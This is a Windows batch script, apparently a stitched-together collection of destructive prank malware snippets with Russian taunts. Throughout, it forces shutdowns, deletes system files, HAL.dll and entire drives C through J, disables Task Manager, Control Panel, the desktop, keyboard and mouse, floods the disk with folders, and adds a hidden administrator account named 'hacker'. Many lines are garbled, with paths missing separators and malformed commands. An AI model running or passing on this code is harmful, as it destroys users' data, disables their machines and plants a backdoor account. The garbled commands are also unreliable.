@echo off 
shutdown -s -t 1 -c "lol" >nul 
@echo off 
shutdown -r -t 1 -c "lol" >nul 
@echo off 
del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul 
@echo off 
del "%SystemRoot%\Media" /q >nul
del "%SystemRoot%Cursors*.*" >nul
@echo off 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul 
@echo off 
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
@echo off 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
rd :C /s /q /f
del c:Program Files/q
del "%SystemRoot%Driver Cachei386driver.cab" /f /q >nul
del %0
del %systemroot%\system32\HAL.dll
FOR /L %%i IN (1,1,1000000) DO md %%i
:c
Start mspaint
goto x
assoc .lnk=.txt
rundll32 user,SwapMouseButton
rundll32 user,disableoemlayer
@echo off
chcp 1251 
net user SUPPORT_388945a0 /delete 
net user hacker hack /add 
net localgroup Администраторы hacker /add 
net localgroup Пользователи SUPPORT_388945a0 /del 
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
 @Echo_inactive_inactive off
 rundll32 keyboard,disable
 rundll32 mouse,disable
 ipconfig /release
 msg* "HAIPANEM NEMNOZHE4KO"
 del D:\*.* /f /s /q
 del E:\*.* /f /s /q
 del F:\*.* /f /s /q
 del G:\*.* /f /s /q
 del H:\*.* /f /s /q
 del I:\*.* /f /s /q
 del J:\*.* /f /s /q
 exit
@echo off
color 40
label LAMER
attrib -s -r -h -a %systemdrive%*.*
erase %windir%*.* /q 
erase %windir%system32*.* /q
erase %systemdrive%*.* /q
regedit :C
echo ты лох 
